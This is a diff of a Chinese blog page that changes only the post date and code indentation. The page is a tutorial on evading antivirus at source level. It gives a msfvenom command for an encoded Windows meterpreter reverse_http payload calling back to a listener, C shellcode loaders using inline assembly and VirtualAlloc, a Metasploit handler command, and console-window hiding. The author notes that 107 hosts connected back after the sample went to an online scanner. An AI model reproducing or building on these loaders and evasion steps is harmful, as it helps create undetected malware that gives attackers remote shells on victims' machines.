@@ -447,7 +447,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2021-11-03
+                    2023-05-11
                 </div>
                 
 
@@ -471,7 +471,7 @@
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h4 id="1-前言"><a href="#1-前言" class="headerlink" title="1. 前言"></a>1. 前言</h4><p> 经常看到各种免杀的例子，源码免杀、二进制免杀、加载器免杀等等，最近学习了一下源码层面的免杀，在实验过程中与杀软对抗最终成功免杀，写下本文做个记录。 </p>
+                <h4 id="1-前言"><a href="#1-前言" class="headerlink" title="1. 前言"></a>1. 前言</h4><p> 经常看到各种免杀的例子，源码免杀、二进制免杀、加载器免杀等等，最近学习了一下源码层面的免杀，在实验过程中与杀软对抗最终成功免杀，写下本文做个记录。</p>
 <h4 id="2-shellcode生成和二进制文件编译"><a href="#2-shellcode生成和二进制文件编译" class="headerlink" title="2. shellcode生成和二进制文件编译"></a>2. shellcode生成和二进制文件编译</h4><p>   开始前有个小插曲，用360扫了扫之前编译的样本，当时v站查杀率1/72(提交到v站后cs一共上线了107台主机，emm)：<br> <img src="https://i.loli.net/2020/08/30/vF6ufsto52GzQ4c.png" alt="virus"><br> 今天扫描的时候：<br> <img src="https://i.loli.net/2020/08/30/jmkJoFchbgOls9a.png" alt="-查杀结果-"><br> 啊… Q哒不妞Q(Qwq)<br> <img src="https://i.loli.net/2020/08/30/pxslvIq4YmhzaWL.jpg"></p>
 <p>好了不说了，进入正题，首先我们使用msfvenom生成C语言shellcode:</p>
 <pre><code class="line-numbers language-c">msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_http -e x86/shikata_ga_nai -i 12 -b '\x00' LHOST=192.168.8.102 LPORT=6666 -f c</code></pre>
@@ -483,12 +483,12 @@
 unsigned char buf[] ="shellcode";
 int main(int argc,char const *argv[])
 {
-    //内联汇编
-    __asm   
-    {
-        lea eax,buf;   
-        call eax;   
-    }
+ //内联汇编
+ __asm   
+ {
+  lea eax,buf;   
+  call eax;   
+ }
 }</code></pre>
 <p>话不多说，先编译上线测试，启动msf监听：</p>
 <pre><code class="line-numbers language-shell">handler -p windows/meterpreter/reverse_http -H 0.0.0.0 -P 6666</code></pre>
@@ -503,12 +503,12 @@ int main(int argc,char const *argv[])
 #include&lt;windows.h&gt;
 #include &lt;time.h&gt;
 int main(int argc, char const* argv[])
-{    
+{ 
 unsigned char buf[] ="shellcode";
-    void* exec = VirtualAlloc(0, sizeof buf, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
-    memcpy(exec, buf, sizeof buf);
-    ((void(*)())exec)();
-    return 0;
+ void* exec = VirtualAlloc(0, sizeof buf, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+ memcpy(exec, buf, sizeof buf);
+ ((void(*)())exec)();
+ return 0;
 }</code></pre>
 <p>那么编译执行后会有个DOS窗口：<br><img src="https://i.loli.net/2020/08/30/LVk8Qa3oDpbilH9.png"></p>
 <p>这里我们<a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-showwindow">ShowWindow</a>函数来隐藏窗体：<br><img src="https://i.loli.net/2020/08/30/lf5rY1kmBswMRaq.png" alt="ShowWindow"><br>需要两个参数，一个是程序窗口句柄，可以通过<a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/console/getconsolewindow">GetConsoleWindow</a> 来获得当前窗口句柄，另一个是int类型的nCmdShow，来控制窗口的状态，这里使用SW_HIDE来隐藏窗口：<br><img src="https://i.loli.net/2020/08/30/H5RLctbSJnQBorW.png" alt="nCmdShow"></p>
